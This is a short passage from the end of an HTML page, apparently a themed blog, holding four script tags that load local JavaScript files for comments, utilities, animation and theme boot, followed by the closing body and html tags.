<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
